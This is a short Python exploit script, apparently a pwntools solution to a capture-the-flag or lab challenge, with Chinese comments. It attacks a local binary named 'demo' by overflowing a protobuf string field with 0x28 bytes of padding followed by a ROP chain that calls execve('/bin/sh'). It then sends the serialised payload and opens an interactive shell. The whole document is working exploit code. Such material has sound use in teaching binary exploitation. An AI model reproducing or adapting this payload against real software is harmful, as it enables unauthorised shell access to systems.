from demo import*
import demo_pb2
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])

p = process('./demo')
elf = ELF('./demo')
rop = ROP(elf)

# 构造rop链
rop.execve(next(elf.search(b'/bin/sh\x00')), 0, 0)
rop_chain = rop.chain()

# 构造msg (string类型必须为utf-8编码，注意不能有非utf-8字符，可以使用bytes类型)
msg = demo_pb2.demo_msg()
msg.str = b'a' * 0x28 + rop_chain
msg.size = 0x28 + len(rop_chain)

# 序列化
payload = msg.SerializeToString()

# 发送payload
p.sendline(str(len(payload)))
p.send(payload)

p.interactive()

